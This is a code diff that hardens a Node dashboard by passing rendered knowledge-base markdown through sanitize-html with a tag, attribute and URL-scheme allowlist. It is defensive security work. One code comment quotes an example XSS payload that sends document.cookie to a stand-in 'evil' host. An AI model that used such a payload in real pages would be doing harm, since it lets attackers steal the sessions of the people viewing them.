@@ -4,6 +4,7 @@ import fs from 'fs';
 import path from 'path';
 import matter from 'gray-matter';
 import { marked } from 'marked';
+import sanitizeHtml from 'sanitize-html';
 import { buildUserRoster, readPeopleDir } from './roster.mjs';
 import { createRequire } from 'module';
 // better-sqlite3 is in the parent /opt/breadbrich/node_modules, not kb-ui's
@@ -147,6 +148,46 @@ function canView(frontmatter, username) {
 function esc(str) {
   if (!str) return '';
   return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+}
+
+// Render KB markdown -> HTML, then sanitize. KB documents now include
+// third-party-authored content synced by knowledge connectors
+// (Notion / Google Drive -> context/connectors/...), so a doc an outside
+// collaborator can edit could embed raw HTML like
+// <img src=x onerror=fetch('//evil/'+document.cookie)> or <script>...</script>
+// and run in an authenticated admin's dashboard session on view. marked() does
+// NOT sanitize, so every marked() render of user/connector content MUST go
+// through this helper. sanitize-html strips any tag/attr not on the allowlist,
+// which removes <script>, <style>, all on* event handlers, and (via the
+// scheme allowlist) javascript:/data: URLs. This is ONLY for document/markdown
+// bodies — the dashboard's own trusted layout/nav/scripts are never sanitized.
+const MARKDOWN_SANITIZE_OPTIONS = {
+  allowedTags: [
+    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
+    'p', 'br', 'hr',
+    'strong', 'em', 'b', 'i', 'u', 'del', 's', 'sub', 'sup',
+    'code', 'pre',
+    'ul', 'ol', 'li',
+    'blockquote',
+    'a',
+    'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td',
+  ],
+  allowedAttributes: {
+    a: ['href', 'title'],
+    th: ['align'],
+    td: ['align'],
+    code: ['class'], // marked emits language-* classes for fenced code blocks
+    pre: ['class'],
+  },
+  // Any scheme not listed here (e.g. javascript:, data:, vbscript:) is dropped.
+  allowedSchemes: ['http', 'https', 'mailto'],
+  allowProtocolRelative: false,
+  // img is intentionally NOT in allowedTags: the dashboard renders no images
+  // today and dropping the tag entirely removes the classic
+  // <img src=x onerror=...> vector with zero legitimate cost.
+};
+function renderMarkdown(md) {
+  return sanitizeHtml(marked(md || ''), MARKDOWN_SANITIZE_OPTIONS);
 }
 
 function walkDir(dir, basePath = '') {
@@ -343,7 +384,7 @@ app.get('/', (req, res) => {
   const indexPath = path.join(CONTEXT_DIR, 'index.md');
   if (fs.existsSync(indexPath)) {
     const { content } = readDoc(indexPath);
-    summary = `<div class="doc-content" style="margin-top:24px">${marked(content)}</div>`;
+    summary = `<div class="doc-content" style="margin-top:24px">${renderMarkdown(content)}</div>`;
   }
 
   let body = '<h2 class="section-header">\u{1F4CA} Dashboards</h2>';
@@ -1216,7 +1257,7 @@ app.get('/doc/:category/:file', (req, res) => {
     visibleContent = content.replace(/^## Personnel Notes[\s\S]*?(?=^## |\s*$)/m, '');
   }
 
-  const html = marked(visibleContent);
+  const html = renderMarkdown(visibleContent);
 
   const body = `
     <div class="breadcrumb"><a href="/">Home</a> / <a href="/category/${cat}">${icon} ${cat.charAt(0).toUpperCase() + cat.slice(1)}</a> / ${title}</div>
@@ -1566,7 +1607,7 @@ app.get('/logs', (req, res) => {
   let logContent = '';
   if (fs.existsSync(logPath)) {
     const { content } = readDoc(logPath);
-    logContent = marked(content);
+    logContent = renderMarkdown(content);
   }
 
   // Also read live message stats from DB
